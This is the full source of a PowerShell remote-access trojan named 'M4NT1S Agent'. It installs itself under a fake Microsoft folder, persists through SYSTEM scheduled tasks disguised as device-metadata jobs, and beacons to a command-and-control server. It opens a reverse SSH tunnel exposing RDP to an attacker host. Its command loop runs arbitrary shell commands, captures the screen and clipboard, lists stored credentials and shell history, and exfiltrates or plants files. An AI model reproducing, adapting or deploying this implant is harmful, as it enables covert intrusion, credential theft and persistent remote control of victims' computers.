# ============================================================
# M4NT1S Agent — install + persistence + agent + tunnel
# Assumes it is invoked from an ALREADY-ELEVATED PowerShell.
# Modes:
#   auto   (default): install + kick both scheduled tasks + exit
#   install          : same as auto
#   agent            : run poll loop (called by scheduled task)
#   tunnel           : run ssh -R supervisor (called by scheduled task)
# ============================================================
param([string]$Mode = "auto")
if (-not $Mode) { $Mode = "auto" }

# ---------- CONFIG (EDIT BEFORE EMBEDDING) ----------
$C2Url         = "https://c2.computerfix.services/api/v1"
$SshServer     = "tunnel@YOUR_VPS_HOST"          # user@host for ssh -R
$SshRemotePort = 3389                            # port bound on VPS
$SshLocalPort  = 3389                            # target-side port (22=SSH, 3389=RDP)
# ----------------------------------------------------

$InstallDir = "C:\ProgramData\Microsoft\DeviceMetadata"
$AgentTask  = "Microsoft\Windows\Device Setup\Device Metadata Refresh"
$TunnelTask = "Microsoft\Windows\Device Setup\Device Metadata Sync"
$SelfPath   = "$InstallDir\a.ps1"
$KeyPath    = "$InstallDir\id_tunnel"
$LockFile   = "$InstallDir\installed.lock"
$LogFile    = "$InstallDir\agent.log"

function Post($path, $obj) {
    $body = $obj | ConvertTo-Json -Compress -Depth 10
    Invoke-RestMethod -Uri "$C2Url$path" -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 20
}
function Log($msg) {
    $line = "$(Get-Date -Format o)  $msg"
    try {
        if (Test-Path $InstallDir) {
            if ((Get-Item $LogFile -ErrorAction SilentlyContinue).Length -gt 1048576) {
                Move-Item $LogFile "$LogFile.old" -Force -ErrorAction SilentlyContinue
            }
            $line | Out-File $LogFile -Append -ErrorAction SilentlyContinue
        }
    } catch { }
}
function Get-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Domain {
    $cs = Get-CimInstance Win32_ComputerSystem
    if ($cs.PartOfDomain) { $cs.Domain } else { "WORKGROUP" }
}
function Resolve-PayloadSource {
    $cands = Get-CimInstance Win32_LogicalDisk -ErrorAction SilentlyContinue |
             Where-Object { $_.DriveType -eq 2 }
    foreach ($c in $cands) {
        if ($c.DeviceID -and (Test-Path "$($c.DeviceID)\payload.ps1")) {
            return "$($c.DeviceID)\payload.ps1"
        }
    }
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) { return $PSCommandPath }
    if (Test-Path $SelfPath) { return $SelfPath }
    return $null
}

# ================== INSTALL (auto / install) ==================
if ($Mode -eq "install" -or $Mode -eq "auto") {
    Log "[*] Installer starting (elevated context assumed)"
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null

    $src = Resolve-PayloadSource
    if (-not $src) {
        Log "[!] No payload source found (no removable payload.ps1, no PSCommandPath, no prior install). Aborting."
        exit 1
    }
    Log "[+] Source: $src"
    Copy-Item $src $SelfPath -Force
    Log "[+] Copied to $SelfPath"

    if (-not (Test-Path $KeyPath)) {
        Log "[*] Generating SSH keypair..."
        & ssh-keygen -t ed25519 -f $KeyPath -N '""' -q 2>&1 | Out-Null
        if (Test-Path $KeyPath) { Log "[+] Key generated" }
        else { Log "[!] Key generation failed - ssh.exe missing?" }
    }

    $psExe = "powershell -w h -ep bypass -f `"$SelfPath`""
    schtasks /create /tn $AgentTask  /tr "$psExe -Mode agent"  /sc onstart /ru SYSTEM /rl highest /f 2>$null | Out-Null
    schtasks /create /tn $TunnelTask /tr "$psExe -Mode tunnel" /sc onstart /ru SYSTEM /rl highest /f 2>$null | Out-Null
    Log "[+] Scheduled tasks created/updated"

    "installed $(Get-Date -Format o)" | Out-File $LockFile
    schtasks /run /tn $AgentTask  2>$null | Out-Null
    schtasks /run /tn $TunnelTask 2>$null | Out-Null
    Log "[+] Both tasks kicked - SYSTEM processes starting"

    if (Test-Path "$KeyPath.pub") {
        Log "[*] Public key (add to VPS ~tunnel/.ssh/authorized_keys):"
        Get-Content "$KeyPath.pub" | ForEach-Object { Log "    $_" }
    }

    Log "[*] Installer done. Exiting; scheduled tasks take over."
    exit 0
}

# ================== TUNNEL ==================
if ($Mode -eq "tunnel") {
    Log "[*] Tunnel supervisor starting"
    while ($true) {
        if (-not (Test-Path $KeyPath)) { Start-Sleep 30; continue }
        $sshArgs = @(
            "-N",
            "-R", "${SshRemotePort}:localhost:${SshLocalPort}",
            "-i", $KeyPath,
            "-o", "ExitOnForwardFailure=yes",
            "-o", "ServerAliveInterval=15",
            "-o", "ServerAliveCountMax=3",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "UserKnownHostsFile=$InstallDir\known_hosts",
            "-o", "BatchMode=yes",
            $SshServer
        )
        try {
            Start-Process -FilePath "ssh.exe" -ArgumentList $sshArgs -WindowStyle Hidden -PassThru -Wait | Out-Null
        } catch { }
        Start-Sleep -Seconds 10
    }
    exit 0
}

# ================== AGENT ==================
$runLock = "$InstallDir\running.pid"
if (Test-Path $runLock) {
    $oldPid = (Get-Content $runLock -ErrorAction SilentlyContinue)
    if ($oldPid -and (Get-Process -Id $oldPid -ErrorAction SilentlyContinue) -and ($oldPid -ne $PID)) {
        Log "[!] Another agent instance already running (pid $oldPid). Exiting."
        exit 0
    }
}
$PID | Out-File $runLock -Force

$guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
$sha  = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($guid))
$fingerprint = ([BitConverter]::ToString($sha) -replace '-','').ToLower().Substring(0,16)

$admin  = Get-Admin
$domain = Get-Domain

Log "[*] Agent starting (admin=$admin domain=$domain)"

$id = $null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $reg = Post '/register' @{
            hostname    = $env:COMPUTERNAME
            os          = (Get-CimInstance Win32_OperatingSystem).Caption
            kernel      = (Get-CimInstance Win32_OperatingSystem).Version
            fingerprint = $fingerprint
            admin       = $admin
            domain      = $domain
        }
        if ($reg.numeric_id) { $id = [int]$reg.numeric_id; break }
    } catch {
        if ($i -eq 0) { Log "[!] Register attempt failed: $($_.Exception.Message)" }
        Start-Sleep 20
    }
}
if (-not $id) {
    Log "[!] Register failed after 30 attempts. Exiting."
    Remove-Item $runLock -Force -ErrorAction SilentlyContinue
    exit 1
}
Log "[+] Registered as ID $id"

function Do-Status {
    $os = Get-CimInstance Win32_OperatingSystem
    $up = (Get-Date) - $os.LastBootUpTime
    $pubKey = ""
    if (Test-Path "$KeyPath.pub") { $pubKey = (Get-Content "$KeyPath.pub" -Raw).Trim() }
    "User: $env:USERDOMAIN\$env:USERNAME`nAdmin: $admin`nHost: $env:COMPUTERNAME`nDomain: $domain`nOS: $($os.Caption) $($os.Version)`nUptime: $([int]$up.TotalHours)h $($up.Minutes)m`nSSHPubkey: $pubKey"
}
function Do-Sysinfo {
    $groups = (Get-LocalGroup | Where-Object { (Get-LocalGroupMember $_.Name -ErrorAction SilentlyContinue).Name -contains "$env:USERDOMAIN\$env:USERNAME" } | Select-Object -Expand Name) -join ", "
    $adapters = (Get-NetAdapter | Where-Object Status -eq 'Up' | ForEach-Object { "$($_.Name)=$($_.InterfaceDescription)" }) -join " | "
    "Domain: $domain`nUser: $env:USERDOMAIN\$env:USERNAME`nGroups: $groups`nAdapters: $adapters"
}
function Do-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
        [System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $bmp.Dispose()
        return "IMAGE:" + [Convert]::ToBase64String($ms.ToArray())
    } catch { return "ERROR: $($_.Exception.Message)" }
}
function Do-Triangulate { (netsh wlan show networks mode=bssid 2>&1 | Out-String) }
function Do-Clipboard { try { (Get-Clipboard -Raw) } catch { "ERROR: $($_.Exception.Message)" } }
function Do-Processes {
    (Get-Process | Sort-Object WS -Descending | Select-Object -First 40 | ForEach-Object {
        "{0,-25} {1,8} {2,8}MB" -f $_.ProcessName, $_.Id, [math]::Round($_.WS/1MB)
    }) -join "`n"
}
function Do-Network { "=== ipconfig ===`n$(ipconfig /all | Out-String)`n=== route ===`n$(route print | Out-String)`n=== arp ===`n$(arp -a | Out-String)" }
function Do-Dns { (ipconfig /displaydns | Out-String) }
function Do-Defender {
    try {
        "=== Status ===`n$(Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled | Format-List | Out-String)`n=== Exclusions ===`n$(Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension | Format-List | Out-String)"
    } catch { "ERROR: $($_.Exception.Message)" }
}
function Do-PersistList {
    "=== Tasks ===`n$((Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Select-Object -First 30 TaskName, TaskPath | Format-Table -AutoSize | Out-String))`n=== HKCU Run ===`n$((Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Format-List | Out-String))"
}
function Do-FilePull($path) {
    try {
        if (-not (Test-Path -LiteralPath $path)) { return "ERROR: not found: $path" }
        $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $path))
        $name = Split-Path $path -Leaf
        return "FILE:${name}:" + [Convert]::ToBase64String($bytes)
    } catch { return "ERROR: $($_.Exception.Message)" }
}
function Do-FilePush($path, $b64) {
    try {
        $bytes = [Convert]::FromBase64String($b64)
        [System.IO.File]::WriteAllBytes($path, $bytes)
        "Wrote $($bytes.Length) bytes to $path"
    } catch { return "ERROR: $($_.Exception.Message)" }
}
function Do-CredList {
    "=== cmdkey ===`n$(cmdkey /list | Out-String)`n=== vault ===`n$(vaultcmd /listcreds:'Windows Credentials' 2>&1 | Out-String)"
}
function Do-History {
    $p = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $p) { Get-Content $p -Tail 200 | Out-String } else { "no PS history" }
}
function Do-TunnelStatus {
    $p = Get-Process ssh -ErrorAction SilentlyContinue
    if (-not $p) { "Tunnel: not running" }
    else { ($p | ForEach-Object { "ssh pid=$($_.Id) started=$($_.StartTime)" }) -join "`n" }
}
function Do-TunnelStart {
    schtasks /run /tn $TunnelTask 2>$null | Out-Null
    "Tunnel start requested"
}
function Do-TunnelStop {
    schtasks /end /tn $TunnelTask 2>$null | Out-Null
    Get-Process ssh -ErrorAction SilentlyContinue | Stop-Process -Force
    "Tunnel stopped"
}
function Do-RdpEnable {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    "RDP enabled"
}
function Do-RdpDisable {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 1
    Disable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    "RDP disabled"
}
function Do-Killswitch {
    schtasks /delete /tn $AgentTask  /f 2>$null | Out-Null
    schtasks /delete /tn $TunnelTask /f 2>$null | Out-Null
    schtasks /end    /tn $TunnelTask 2>$null | Out-Null
    Get-Process ssh -ErrorAction SilentlyContinue | Stop-Process -Force
    Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
    "KILLSWITCH triggered"
}

function Invoke-Cmd($job) {
    $cmd = $job.command
    $pl  = $job.payload
    switch ($cmd) {
        'STATUS'            { Do-Status }
        'SYSINFO'           { Do-Sysinfo }
        'SHELL'             { (cmd /c $pl.cmd 2>&1 | Out-String) }
        'SCREEN_CAPTURE'    { Do-Screenshot }
        'TRIANGULATE'       { Do-Triangulate }
        'CLIPBOARD_GET'     { Do-Clipboard }
        'PROCESSES'         { Do-Processes }
        'NETWORK_INFO'      { Do-Network }
        'DNS_CACHE'         { Do-Dns }
        'DEFENDER_CHECK'    { Do-Defender }
        'PERSIST_LIST'      { Do-PersistList }
        'TASK_CLEANUP'      { Do-Killswitch }
        'FILE_PULL'         { Do-FilePull $pl.path }
        'FILE_PUSH'         { Do-FilePush $pl.path $pl.data_b64 }
        'CRED_LIST'         { Do-CredList }
        'HISTORY_READ'      { Do-History }
        'TUNNEL_START'      { Do-TunnelStart }
        'TUNNEL_STOP'       { Do-TunnelStop }
        'TUNNEL_STATUS'     { Do-TunnelStatus }
        'RDP_ENABLE'        { Do-RdpEnable }
        'RDP_DISABLE'       { Do-RdpDisable }
        'KILLSWITCH'        { Do-Killswitch }
        default             { "ERROR: unknown command: $cmd" }
    }
}

$pollCount   = 0
$lastLogTick = 0
while ($true) {
    try {
        $job = Post '/poll' @{ id = $id; admin = $admin; domain = $domain }
        $pollCount++
        if ($job -and $job.command -and $job.command -ne 'NOP') {
            Log "[>] cmd #$($job.task_id): $($job.command)"
            $out = Invoke-Cmd $job
            if ($null -eq $out) { $out = "" }
            Post '/result' @{
                id = $id; task_id = $job.task_id; status = 'completed'
                output = [string]$out; exit_code = 0
            } | Out-Null
            Log "[<] done #$($job.task_id)"
        }
        if (($pollCount - $lastLogTick) -ge 60) {
            Log "[*] heartbeat (poll #$pollCount)"
            $lastLogTick = $pollCount
        }
    } catch {
        Log "[!] poll error: $($_.Exception.Message)"
        Start-Sleep -Seconds 5
    }
    Start-Sleep -Milliseconds 1000
}